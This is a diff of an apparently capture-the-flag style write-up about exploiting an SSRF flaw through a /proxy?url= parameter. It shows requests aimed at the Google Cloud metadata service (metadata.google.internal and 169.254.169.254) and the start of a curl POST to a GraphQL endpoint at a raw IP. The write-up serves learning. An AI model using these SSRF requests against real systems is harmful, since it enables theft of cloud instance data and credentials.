@@ -26,7 +26,7 @@ Using our exposed /proxy?url= parameter, I attempted to create the following req
 
 ```GET /proxy?url=http://metadata.google.internal/computeMetadata/v1/instance/attributes/```
 
-Unfortunately, this request resulted in an invalid URL response. However, it is worth a shot to try the request again with the resolved hostname:
+Unfortunately, this request resulted in an invalid URL response. Since metadata.google.internal did not resolve (as expected in SSRF), I tried the direct IP 169.254.169.254:
 
 ```GET /proxy?url=http://169.254.169.254/computeMetadata/v1/instance/attributes/```
 
@@ -58,7 +58,7 @@ A quick base64 decode reveals the name of the target mutation "m309e5336"
 
 ---
 
-Now that I had the name for the mutation, one more request is required:
+Now that I have the name for the mutation, one more request is required:
 
 ```
 curl -X POST "http://34.86.186.68:8080/graphql" \
